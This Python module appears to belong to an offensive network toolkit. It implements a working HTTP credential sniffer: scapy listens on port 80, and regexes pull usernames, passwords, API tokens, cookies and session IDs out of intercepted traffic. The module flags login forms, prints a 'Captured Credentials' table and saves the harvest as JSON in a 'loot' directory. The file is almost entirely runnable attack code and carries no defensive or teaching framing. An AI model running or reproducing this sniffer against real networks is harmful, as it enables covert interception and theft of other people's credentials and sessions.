from __future__ import annotations

import re
import json
import time
import threading
from pathlib import Path
from typing import Optional, Callable

import scapy.all as scapy
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from loguru import logger


CREDENTIAL_PATTERNS = {
    "username": re.compile(
        r'(?:username|user|login|email|uname|uid|account|handle|nickname)'
        r'[=:]\s*["\']?([^&\s"\']{3,64})["\']?',
        re.IGNORECASE,
    ),
    "password": re.compile(
        r'(?:password|passwd|pass|pwd|secret|pin)'
        r'[=:]\s*["\']?([^&\s"\']{3,128})["\']?',
        re.IGNORECASE,
    ),
    "token": re.compile(
        r'(?:token|api[_-]?key|bearer|jwt|auth)'
        r'[=:]\s*["\']?([a-zA-Z0-9._\-]{20,})["\']?',
        re.IGNORECASE,
    ),
    "cookie": re.compile(
        r'(?:Cookie:|Set-Cookie:)\s*([^;]+)',
        re.IGNORECASE,
    ),
    "session": re.compile(
        r'(?:session|sid|sessid)'
        r'[=:]\s*["\']?([a-zA-Z0-9._\-]{10,})["\']?',
        re.IGNORECASE,
    ),
}

HTTP_REQUEST_RE = re.compile(
    rb'(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+([^\s]+)\s+HTTP/\d.\d',
)

HTTP_HOST_RE = re.compile(rb'Host:\s*([^\r\n]+)')

LOGIN_FORM_RE = re.compile(
    r'<form[^>]*?(?:login|signin|auth)[^>]*?>',
    re.IGNORECASE,
)


class CredentialEntry:
    def __init__(self, timestamp: float, src_ip: str, dst_ip: str,
                 url: str, cred_type: str, value: str, raw: str = ""):
        self.timestamp = timestamp
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.url = url
        self.cred_type = cred_type
        self.value = value
        self.raw = raw

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "url": self.url,
            "type": self.cred_type,
            "value": self.value,
            "raw": self.raw[:500] if self.raw else "",
        }


class HTTPCapture:
    def __init__(self, loot_dir: str = "loot", interface: Optional[str] = None):
        self._loot_dir = Path(loot_dir)
        self._loot_dir.mkdir(parents=True, exist_ok=True)
        self._interface = interface
        self._credentials: list[CredentialEntry] = []
        self._httpx_requests: list[dict] = []
        self._lock = threading.Lock()
        self._running = False
        self._sniff_thread: Optional[threading.Thread] = None
        self._hit_callbacks: list[Callable] = []

    @property
    def credentials(self) -> list[CredentialEntry]:
        return list(self._credentials)

    def on_hit(self, callback: Callable) -> None:
        self._hit_callbacks.append(callback)

    def _extract_credentials(self, src_ip: str, dst_ip: str, url: str, data: str) -> None:
        for cred_type, pattern in CREDENTIAL_PATTERNS.items():
            matches = pattern.findall(data)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if len(match) < 3:
                    continue
                entry = CredentialEntry(
                    timestamp=time.time(),
                    src_ip=src_ip,
                    dst_ip=dst_ip,
                    url=url,
                    cred_type=cred_type,
                    value=match,
                    raw=data[:1000],
                )
                with self._lock:
                    self._credentials.append(entry)

                logger.info(f"[CRED] {cred_type}: {match} @ {src_ip} -> {url}")

                for cb in self._hit_callbacks:
                    try:
                        cb(entry)
                    except Exception as e:
                        logger.warning(f"cred callback error: {e}")

    def _parse_http(self, packet) -> None:
        try:
            if not packet.haslayer(scapy.TCP) or not packet.haslayer(scapy.Raw):
                return

            ip = packet[scapy.IP]
            tcp = packet[scapy.TCP]
            raw = bytes(packet[scapy.Raw])

            if len(raw) < 10:
                return

            src_ip, dst_ip = ip.src, ip.dst
            src_port, dst_port = tcp.sport, tcp.dport

            req_match = HTTP_REQUEST_RE.search(raw)
            host_match = HTTP_HOST_RE.search(raw)

            if not req_match or not host_match:
                return

            path = req_match.group(1).decode("utf-8", errors="replace")
            host = host_match.group(1).decode("utf-8", errors="replace").strip()
            url = f"http://{host}{path}"
            body = raw.decode("utf-8", errors="replace")

            req_data = {
                "timestamp": time.time(),
                "src": f"{src_ip}:{src_port}",
                "dst": f"{dst_ip}:{dst_port}",
                "url": url,
                "raw": body[:2000],
            }
            with self._lock:
                self._httpx_requests.append(req_data)

            self._extract_credentials(src_ip, dst_ip, url, body)

            if LOGIN_FORM_RE.search(body):
                logger.info(f"[LOGIN-FORM] {url} from {src_ip}")
                with self._lock:
                    entry = CredentialEntry(
                        timestamp=time.time(), src_ip=src_ip, dst_ip=dst_ip,
                        url=url, cred_type="login_form", value=url, raw=body[:2000],
                    )
                    self._credentials.append(entry)

        except Exception as e:
            logger.debug(f"http parse error: {e}")

    def start(self) -> None:
        self._running = True
        bpf = "tcp port 80"

        def sniff_loop():
            try:
                scapy.sniff(
                    iface=self._interface,
                    filter=bpf,
                    prn=self._parse_http,
                    store=False,
                    stop_filter=lambda _: not self._running,
                )
            except Exception as e:
                if self._running:
                    logger.error(f"http capture error: {e}")

        self._sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        self._sniff_thread.start()
        logger.info(f"http capture started (port 80) → {self._loot_dir}")

    def stop(self) -> None:
        self._running = False

        if self._credentials:
            cred_file = self._loot_dir / f"credentials_{int(time.time())}.json"
            with open(cred_file, "w") as f:
                json.dump([c.to_dict() for c in self._credentials], f, indent=2)
            logger.info(f"credentials saved: {cred_file} ({len(self._credentials)} entries)")

        if self._httpx_requests:
            req_file = self._loot_dir / f"requests_{int(time.time())}.json"
            with open(req_file, "w") as f:
                json.dump(self._httpx_requests[-500:], f, indent=2)
            logger.info(f"http requests saved: {req_file}")

        logger.info("http capture stopped")

    def display_loot(self, console: Optional[Console] = None) -> None:
        cons = console or Console()

        if not self._credentials:
            cons.print("[dim]no credentials captured yet[/dim]")
            return

        table = Table(title="Captured Credentials", title_style="bold red")
        table.add_column("Type", style="cyan")
        table.add_column("Value", style="yellow")
        table.add_column("URL", style="dim")
        table.add_column("Source", style="white")

        for c in self._credentials[-20:]:
            val = c.value if len(c.value) <= 40 else c.value[:37] + "..."
            table.add_row(c.cred_type, val, c.url[:50], c.src_ip)

        cons.print(table)
        cons.print(f"[dim]{len(self._credentials)} credentials captured → {self._loot_dir}[/dim]")
